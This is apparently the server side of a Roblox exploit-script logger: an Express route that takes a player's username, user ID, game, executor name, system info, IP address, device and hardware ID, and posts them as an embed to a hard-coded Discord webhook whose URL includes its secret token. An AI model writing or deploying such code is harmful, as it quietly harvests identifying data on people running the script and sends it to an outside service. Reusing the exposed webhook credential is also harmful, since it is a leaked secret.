app.post("/webhook", async (req, res) => {
    try {
        const { 
            userId,
            universeId,
            playerName,
            placeId,
            executorName,
            systemInfo,
            ipAddress,
            deviceType,
            hardwareId
        } = req.body;

        // 1. Busca a imagem do jogador
        const userThumbnailUrl = `https://thumbnails.roblox.com/v1/users/avatar?userIds=${userId}&size=150x150&format=Png&isCircular=false`;
        const userThumbnailResponse = await axios.get(userThumbnailUrl);
        const userImageUrl = userThumbnailResponse.data.data[0].imageUrl;

        // 2. Busca a imagem do jogo
        const gameThumbnailUrl = `https://thumbnails.roblox.com/v1/games/icons?universeIds=${universeId}&size=512x512&format=Png&isCircular=false`;
        const gameThumbnailResponse = await axios.get(gameThumbnailUrl);
        const gameImageUrl = gameThumbnailResponse.data.data[0].imageUrl;

        // 3. Monta o embed do Discord
        const embed = {
            title: "**Executed!!**",
            type: "rich",
            thumbnail: { url: userImageUrl }, // Ícone do jogador (pequeno, no canto)
            image: { url: gameImageUrl }, // Ícone do jogo (grande, no corpo)
            description: `Player: ||**${playerName}**||`,
            color: 0x800000,
            fields: [
                { name: "Username", value: playerName, inline: true },
                { name: "Game ID", value: placeId, inline: true },
                { name: "User ID", value: userId, inline: true },
                { name: "Executor", value: executorName, inline: true },
                { name: "System Info", value: systemInfo, inline: true },
                { name: "IP Address", value: ipAddress, inline: true },
                { name: "Device", value: deviceType, inline: true },
                { name: "Hardware ID", value: hardwareId, inline: false }
            ]
        };

        // 4. Envia para o Discord
        await axios.post("https://discord.com/api/webhooks/1348054742470758492/oSKgV7EdDOphm3NkHW2efBP7xLPYlkT4IferB1AfjFcCmn7MGUojGaAMrgbF7mHgQ8MW", { embeds: [embed] });
        res.status(200).send("Webhook enviado!");

    } catch (error) {
        console.error("Erro:", error);
        res.status(500).send("Erro interno: " + error.message);
    }
});
